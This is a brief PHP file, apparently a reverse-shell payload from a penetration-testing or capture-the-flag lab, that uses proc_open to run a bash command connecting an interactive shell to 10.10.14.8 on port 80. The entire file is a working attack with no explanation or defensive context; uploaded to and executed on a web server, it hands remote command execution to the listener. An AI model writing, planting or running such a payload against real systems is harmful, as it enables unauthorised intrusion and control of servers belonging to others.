<?php
$cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.8/80 0>&1'";
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("file", "error.txt", "a") // stderr is a file to write to
);
$process = proc_open($cmd, $descriptorspec, $pipes);